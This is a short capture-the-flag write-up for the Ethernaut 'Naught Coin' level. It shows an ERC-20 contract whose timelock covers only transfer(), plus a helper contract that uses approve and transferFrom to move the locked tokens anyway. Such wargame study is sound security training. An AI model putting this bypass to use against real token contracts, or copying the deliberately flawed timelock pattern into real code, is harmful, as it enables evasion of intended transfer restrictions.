# [15. Naught Coin](https://ethernaut.openzeppelin.com/level/0x096bb5e93a204BfD701502EB6EF266a950217218)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/token/ERC20/ERC20.sol';

 contract NaughtCoin is ERC20 {

  // string public constant name = 'NaughtCoin';
  // string public constant symbol = '0x0';
  // uint public constant decimals = 18;
  uint public timeLock = now + 10 * 365 days;
  uint256 public INITIAL_SUPPLY;
  address public player;

  constructor(address _player) 
  ERC20('NaughtCoin', '0x0')
  public {
    player = _player;
    INITIAL_SUPPLY = 1000000 * (10**uint256(decimals()));
    // _totalSupply = INITIAL_SUPPLY;
    // _balances[player] = INITIAL_SUPPLY;
    _mint(player, INITIAL_SUPPLY);
    emit Transfer(address(0), player, INITIAL_SUPPLY);
  }
  
  function transfer(address _to, uint256 _value) override public lockTokens returns(bool) {
    super.transfer(_to, _value);
  }

  // Prevent the initial owner from transferring tokens until the timelock has passed
  modifier lockTokens() {
    if (msg.sender == player) {
      require(now > timeLock);
      _;
    } else {
     _;
    }
  } 
} 
```

Here we have a simple ERC-20 contract in our hands, that prevents us to `transfer` money to someone. However, this does not prevent us to `approve` that someone, and let them call `transferFrom` to take our money. That is precisely what we are going to do. We create and deploy a simple contract:

```solidity
// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.0; 

import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/IERC20.sol";

contract NaughtWithdraw {
  function withdrawFrom(address _tokenAddr, address _from, uint _amount) public {
    bool success = IERC20(_tokenAddr).transferFrom(_from, address(this), _amount);
    require(success, "failed!");
  }
}
```

Then, we simply approve all our tokens to this address, and call `withdrawFrom` there with the respective parameters.
